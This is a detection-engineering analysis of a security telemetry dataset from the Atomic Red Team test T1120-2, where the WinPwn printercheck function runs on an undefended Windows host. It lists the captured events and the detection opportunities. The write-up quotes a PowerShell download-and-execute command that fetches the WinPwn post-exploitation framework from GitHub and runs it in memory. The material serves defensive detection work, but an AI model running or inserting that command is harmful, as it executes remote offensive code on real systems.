# T1120-2: Peripheral Device Discovery — WinPwn printercheck

## Technique Context

T1120 Peripheral Device Discovery describes adversaries enumerating connected peripheral devices to understand the target environment. Knowing which printers, storage devices, or other peripherals are attached can help an adversary plan lateral movement, identify data exfiltration paths, or simply build a more complete picture of the victim organization.

This test uses WinPwn, an open-source PowerShell post-exploitation framework developed by S3cur3Th1sSh1t. The `printercheck` function specifically queries Windows Management Instrumentation (WMI) for installed and connected printers. The script is downloaded directly from GitHub at execution time rather than pre-staged on disk, which means the payload never touches the file system as a discrete file — it executes entirely in memory via `Invoke-Expression`.

The command executed is:
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput
```

This is the live-off-the-internet execution pattern: download and immediately execute a remote script, then call a function from the loaded module.

## What This Dataset Contains

The dataset captures 43 Sysmon events, 4 Security events, and 114 PowerShell events recorded on ACME-WS06 with Windows Defender fully disabled.

The most significant event in the dataset is the Security EID 4688 recording the spawned PowerShell process command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput}
```

Sysmon EID 1 records the same command with full image hashes for the spawned `powershell.exe`. The parent chain is: outer `powershell` test framework → spawned `powershell.exe` with the WinPwn download command.

Sysmon EID 10 records PowerShell accessing the spawned child process with `GrantedAccess: 0x1FFFFF`. Two Sysmon EID 17 named pipe events record the PowerShell host pipes for both the outer test framework and the WinPwn execution process.

A notable Sysmon EID 11 (File Create) event records `svchost.exe` (running as `NT AUTHORITY\NETWORK SERVICE`) writing to `C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\State\keyValueLKG.dat`. This is a Windows Delivery Optimization service artifact — a background system process that wrote a state file coincidentally during the test window. It is not related to the WinPwn execution.

The PowerShell channel (114 events) contains 19 EID 4104 script block events. Of these, the substantive ART-test framework blocks are:
- `Set-ExecutionPolicy Bypass -Scope Process -Force`
- `$ErrorActionPreference = 'Continue'`
- `try { Invoke-AtomicTest T1120 -TestNumbers 2 -Cleanup -Confirm:$false 2>&1 | Out-Null } catch {}`

The WinPwn script itself executes in the child PowerShell process. Because WinPwn is a large script, the script block logging for it would have been distributed across many EID 4104 events; only the first 20 samples are included here.

Security EID 4688 also records `whoami.exe` execution (pre- and post-test context) and the cleanup-phase empty command block.

## What This Dataset Does Not Contain

There are no Sysmon EID 22 (DNS Query) or EID 3 (Network Connection) events capturing the outbound HTTPS connection to `raw.githubusercontent.com`. This is notable — the network telemetry that would confirm the download to `raw.githubusercontent.com:443` is absent from this sample set. This does not mean the connection did not happen; the 20-event Sysmon sample may have been drawn from events that predate or postdate the network phase. Researchers working with the full dataset file should look for Sysmon EID 22 and EID 3 events for this connection.

There is no WMI query telemetry. The `printercheck` function uses WMI internally, but WMI provider activity is not surfaced in the Sysmon or Security channels captured here. No Microsoft-Windows-WMI-Activity events are present in this sample. The WMI channel only shows EID 5860 in the T1123 dataset which was a coincidental BITS activation.

No printer-related Security events (such as System/Application printer events) are present.

Compared to the defended variant (50 Sysmon / 12 Security / 63 PowerShell), this dataset is roughly comparable in Sysmon and Security counts (43 / 4) but much larger in PowerShell (114 vs. 63). The Security count difference (4 vs. 12) reflects that the defended execution triggered multiple Defender inspection process events. The Sysmon similarity is expected for this technique since WinPwn runs in-memory and does not generate file or registry events that Sysmon would count differently.

## Assessment

This is a high-value dataset for detecting live-off-the-internet PowerShell post-exploitation. The `iex(new-object net.webclient).downloadstring(...)` pattern in the EID 4688 command line is a primary detection surface for in-memory script download-and-execute. The specific GitHub URL is pinned to a commit hash (`121dcee...`), which means it is reproducible and can be used as an indicator of compromise in its own right.

The dataset captures real execution against an undefended host, so all the downstream artifacts of WinPwn's `printercheck` function would be present in the full dataset. For analysts building behavioral analytics, the process creation chain and command-line content in this sample are the authoritative evidence of technique execution.

The absence of network events in this sample is worth flagging when using this dataset for detection development — researchers should supplement with the full dataset files to obtain the DNS and TCP connection telemetry.

## Detection Opportunities Present in This Data

**`iex` combined with `net.webclient` and `downloadstring` in a PowerShell command line.** Security EID 4688 and Sysmon EID 1 record the verbatim command string. The `iex(new-object net.webclient).downloadstring(...)` pattern is a well-known in-memory execution idiom. Its presence in a process creation log — rather than only in a script block — occurs here because the ART test framework wraps the execution in a `powershell.exe` child invocation with command-line arguments.

**Download from `raw.githubusercontent.com`.** The specific URL references a known post-exploitation framework (WinPwn) at a pinned commit. Even ignoring the framework identification, any `downloadstring` call targeting `raw.githubusercontent.com` from a non-browser, non-development process is worth scrutiny.

**PowerShell spawning PowerShell.** Sysmon EID 1 records the double-hop PowerShell pattern with full image hashes. The outer process is the ART test framework; the inner process runs the WinPwn download. This parent-child relationship combined with the command-line content is high-fidelity.

**WinPwn function name `printercheck`.** The function name is visible in the command line recorded in EID 4688. If you have string-matching on WinPwn function names, the literal string `printercheck` is present in the process creation telemetry.
